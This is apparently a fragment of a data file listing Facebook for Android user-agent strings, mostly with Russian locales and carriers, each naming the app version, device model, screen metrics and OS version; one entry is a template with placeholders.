"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=2.625,width=1080,height=2094};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2161};FBLC/ru_RU;FBRV/335057661;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3363;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595753;FBDM/{density=3.0,width=1080,height=2141};FBLC/ru_RU;FBRV/311339033;FBCR/Beeline;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1907;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809011;FBDM/{density=3.0,width=1080,height=2050};FBLC/ru_RU;FBRV/310262918;FBCR/Beeline;FBMF/meizu;FBBD/meizu;FBPN/com.facebook.katana;FBDV/meizu note9;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=3.0,width=1080,height=2168};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G780F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400869;FBDM/{density=3.375,width=1080,height=2110};FBLC/ru_RU;FBRV/305464431;FBCR/Tele2;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.0,width=1080,height=2030};FBLC/ru_RU;FBRV/335950585;FBCR/MTS RUS;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZE620KL;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595673;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/311086694;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950287;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/336942278;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/302971455;FBCR/Telia&amp;#17-LT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2069};FBLC/ru_RU;FBRV/335047760;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9750;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/315.0.0.47.113;FBBV/285966672;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=3.0,width=1080,height=2020};FBLC/ru_RU;FBRV/312856793;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823323;FBDM/{density=1.75,width=720,height=1422};FBLC/ru_RU;FBRV/315786241;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A207F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1424};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO CD6;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950303;FBDM/{density=3.0,width=1080,height=2038};FBLC/ru_RU;FBRV/337340031;FBCR/MegaFon #1;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FLA-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/344.0.0.34.116;FBBV/331704134;FBDM/{density=3.375,width=1080,height=2340};FBLC/ru_RU;FBRV/332954393;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919018;FBDM/{density=3.75,width=1440,height=3044};FBLC/zh_HK;FBRV/342293006;FBCR/csl.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9980;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/342243421;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9750;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.38.120;FBBV/292228081;FBDM/{density=3.0,width=1080,height=1812};FBLC/ru_RU;FBRV/0;FBCR/LV TELE2;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/316316483;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2186};FBLC/ru_RU;FBRV/275142282;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621679;FBDM/{density=2.0,width=720,height=1406};FBLC/lt_LT;FBRV/303418653;FBCR/Bite;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672306;FBDM/{density=3.375,width=1080,height=2095};FBLC/ru_RU;FBRV/314845422;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672627;FBDM/{density=2.0,width=720,height=1449};FBLC/ru_RU;FBRV/314609338;FBCR/TELE2;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3MNG;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186867;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBRV/298414505;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950269;FBDM/{density=2.0,width=720,height=1440};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BKK-L21;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.8125,width=1080,height=2033};FBLC/ru_RU;FBRV/337989149;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809025;FBDM/{density=1.75,width=720,height=1423};FBLC/ru_RU;FBRV/310111071;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906205;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/295447765;FBCR/MegaFon;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672608;FBDM/{density=2.0,width=720,height=1440};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BKK-L21;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302426;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/163241295;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A530F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950318;FBDM/{density=1.75,width=720,height=1382};FBLC/ru_RU;FBRV/337672225;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076519;FBDM/{density=3.0,width=1080,height=2295};FBLC/ru_RU;FBRV/304667161;FBCR/MegaFon;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PPA-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950334;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/0;FBCR/TELE2;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2185;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=3.1875,width=1080,height=2104};FBLC/ru_RU;FBRV/338434565;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660394;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/306223046;FBCR/o2 - de+;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2168};FBLC/en_US;FBRV/306052152;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G781W;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/336311065;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595727;FBDM/{density=2.0,width=720,height=1365};FBLC/ru_RU;FBRV/311801224;FBCR/Rostelecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M015F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1184};FBLC/ru_RU;FBRV/335247818;FBCR/BEE LINE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3112;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.75,width=1080,height=2110};FBLC/ru_RU;FBRV/338446883;FBCR/Orange_Egypt;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2186};FBLC/ru_RU;FBRV/337277111;FBCR/YOTA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2177};FBLC/ru_RU;FBRV/335147907;FBCR/Tele2You;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672331;FBDM/{density=3.0,width=1080,height=2139};FBLC/ru_RU;FBRV/314438559;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.75,width=1080,height=2177};FBLC/ru_RU;FBRV/336942278;FBCR/MegaFon;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K6G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.5,width=1440,height=2792};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076497;FBDM/{density=2.0,width=720,height=1424};FBLC/ru_RU;FBRV/304857316;FBCR/MegaFon;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1909;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.75,width=1080,height=2131};FBLC/ru_RU;FBRV/344477035;FBCR/LV TELE2;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/341061796;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J327V;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186794;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZC554KL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1467};FBLC/ru_RU;FBRV/335252214;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518990;FBDM/{density=3.375,width=1080,height=2095};FBLC/ru_RU;FBRV/288817730;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998026;FBDM/{density=2.25,width=720,height=1172};FBLC/ru_RU;FBRV/285101639;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X008D;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.75,width=1080,height=2110};FBLC/ru_RU;FBRV/338253300;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=2.75,width=1080,height=2225};FBLC/ru_RU;FBRV/315666585;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2036;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=3.0,width=1080,height=2177};FBLC/ru_RU;FBRV/314845422;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809027;FBDM/{density=3.1875,width=1080,height=2159};FBLC/ru_RU;FBRV/309893225;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957718;FBDM/{density=1.75,width=720,height=1471};FBLC/ru_RU;FBRV/335335939;FBCR/YOTA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A025F;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/295665573;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/337672225;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279735;FBDM/{density=2.75,width=1080,height=2030};FBLC/ru_RU;FBRV/308545678;FBCR/Beeline;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606729;FBDM/{density=2.625,width=1080,height=2094};FBLC/ru_RU;FBRV/313621410;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2118};FBLC/ru_RU;FBRV/335057661;FBCR/Tele2 RU;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V1911A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/334497015;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279586;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/338732993;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279621;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186844;FBDM/{density=1.75,width=720,height=1411};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/295263550;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279711;FBDM/{density=3.375,width=1080,height=2265};FBLC/ru_RU;FBRV/338434565;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.25,width=720,height=1280};FBLC/ru_RU;FBRV/334698665;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J701F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/335950585;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2255};FBLC/ru_RU;FBRV/335950585;FBCR/KYIVSTAR;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JSN-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621644;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606716;FBDM/{density=2.75,width=1080,height=2150};FBLC/ru_RU;FBRV/312870330;FBCR/MegaFon;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/FB4A;FBAV/{7};FBPN/com.facebook.katana;FBLC/{0}_{1};FBBV/261476344;FBCR/{2};FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/&#123;&#123;density=2.625,width=1080,height=1920&#125;&#125;;FB_FW/1;FBRV/263054303;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998023;FBDM/{density=1.75,width=720,height=1382};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293905870;FBDM/{density=2.0,width=720,height=1358};FBLC/ru_RU;FBRV/295295514;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/AUM-L41;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672897;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/300485215;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.75,width=1080,height=2179};FBLC/ru_RU;FBRV/337989149;FBCR/Tele2You;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2168};FBLC/ru_RU;FBRV/337529659;FBCR/Tele2You;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.75,width=1080,height=2224};FBLC/ru_RU;FBRV/336698666;FBCR/Beeline;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi Note 10 Lite;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335949544;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/336657379;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/MAR-LX1H;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=3.0,width=1080,height=2139};FBLC/ru_RU;FBRV/323725482;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636710;FBDM/{density=2.25,width=720,height=1185};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X220;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672619;FBDM/{density=3.0,width=1080,height=2032};FBLC/ru_RU;FBRV/314673714;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
